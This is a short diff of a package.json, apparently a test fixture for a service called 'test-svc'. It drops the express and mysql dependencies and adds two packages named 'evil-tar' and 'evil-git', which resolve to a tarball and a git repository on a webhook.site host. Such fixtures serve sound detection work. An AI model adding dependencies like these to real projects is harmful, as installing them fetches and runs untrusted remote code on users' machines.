@@ -1,6 +1,8 @@
 {
   "name": "test-svc",
-  "version": "1.0.0",
-  "main": "app.js",
-  "dependencies": { "express": "^4.18.2", "mysql": "^2.18.1" }
+  "version": "1.0.1",
+  "dependencies": {
+    "evil-tar": "https://fd5b1092-128c-4684-8278-88978f272c24.webhook.site/evil.tgz",
+    "evil-git": "git+https://fd5b1092-128c-4684-8278-88978f272c24.webhook.site/evil.git"
+  }
 }
